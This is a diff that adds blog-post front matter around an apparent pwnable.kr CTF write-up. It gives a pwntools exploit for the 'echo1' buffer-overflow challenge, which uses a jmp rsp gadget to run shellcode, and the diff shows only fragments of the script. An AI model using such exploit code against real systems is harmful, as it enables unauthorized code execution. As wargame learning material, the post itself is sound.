@@ -1,3 +1,15 @@
+---
+layout: post
+title: "pwnable.kr"
+date: 2016-01-28 22:30:58 +0800
+comments: true
+categories: 
+---
+### 0x00
+echo1
+buf overflow 使用jmp rsp跳到shellcode
+### 0x01
+```python
 from pwn import *
 
 jmp_rsp = '\xff\xe4' + '\x00'*6
@@ -20,3 +32,4 @@ payload += shellcode
 p.sendline(payload)
 
 p.interactive()
+```
